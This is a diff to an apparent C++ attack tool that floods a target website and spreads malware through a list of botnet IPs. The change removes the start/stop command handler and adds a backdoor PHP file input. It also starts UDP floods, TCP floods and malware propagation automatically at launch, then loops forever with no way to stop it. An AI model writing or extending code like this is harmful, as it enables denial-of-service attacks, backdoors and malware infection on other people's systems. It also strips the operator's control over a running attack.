@@ -27,6 +27,7 @@ string malwarePHP;
 string malwarePayload;
 string malwareJS;
 string malwarePython;
+string backdoorPHP;
 
 bool attackRunning = false;
 
@@ -420,28 +421,6 @@ void runPythonMalware() {
     system(("python3 " + malwarePython).c_str());
 }
 
-void processCommand(string command) {
-    if (command == "start") {
-        if (!attackRunning) {
-            cout << "Starting the DDoS attack and malware propagation..." << endl;
-            startAttack();
-            cout << "Attack started!" << endl;
-        } else {
-            cout << "The attack is already running." << endl;
-        }
-    } else if (command == "stop") {
-        if (attackRunning) {
-            cout << "Stopping the attack..." << endl;
-            stopAttack();
-            cout << "Attack stopped." << endl;
-        } else {
-            cout << "The attack is not currently running." << endl;
-        }
-    } else {
-        cout << "Invalid command. Please enter either 'start' or 'stop'." << endl;
-    }
-}
-
 int main() {
     cout << "Enter the target website URL: ";
     cin >> targetWebsite;
@@ -457,10 +436,13 @@ int main() {
     getline(cin, malwarePHP);
 
     cout << "Enter the path to the JS file for the malware: ";
-getline(cin, malwareJS);
+    getline(cin, malwareJS);
 
     cout << "Enter the path to the Python file for the malware: ";
-getline(cin, malwarePython);
+    getline(cin, malwarePython);
+
+    cout << "Enter the path to the backdoor PHP file: ";
+    getline(cin, backdoorPHP);
 
     malwarePayload = generateMalwarePayload();
 
@@ -468,12 +450,17 @@ getline(cin, malwarePython);
 
     cout << "Botnet IPs generated: " << botnetIPs.size() << endl;
 
+    // Start the attack without the start command
+    for (const auto& ip : botnetIPs) {
+        thread(udpFlood, ip, targetPort).detach();
+        thread(tcpFlood, ip, targetPort).detach();
+        thread(propagateMalware, ip).detach();
+    }
+
+    // Keep the program running indefinitely
     while (true) {
-        string command;
-        cout << "Enter a command ('start' or 'stop'): ";
-        cin >> command;
-        processCommand(command);
+        continue;
     }
 
     return 0;
-} 
+}
